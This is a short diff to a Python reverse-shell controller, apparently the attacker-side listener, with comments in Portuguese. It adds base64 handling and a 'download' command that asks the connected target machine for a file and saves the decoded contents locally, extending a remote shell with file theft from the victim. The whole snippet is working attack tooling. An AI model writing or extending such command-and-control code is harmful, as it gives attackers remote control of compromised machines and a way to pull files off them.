@@ -3,7 +3,7 @@
 #-------------------------------------------------
 
 import socket
-
+import base64
 
 def shell():
     current_dir = target.recv(1024)
@@ -27,6 +27,11 @@ def shell():
             print(res)
         elif command=="":
             pass
+        elif command[:8]=="download": #receve um arquivo remoto
+            target.send(command.encode()) # enviar comando
+            with open(command[9:],'wb') as file_download:
+                data=target.recv(30000) # preparar buffer de recepção
+                file_download.write(base64.b64decode(data))
         else:
             target.send(command.encode())
             res=target.recv(1024).decode().rstrip()
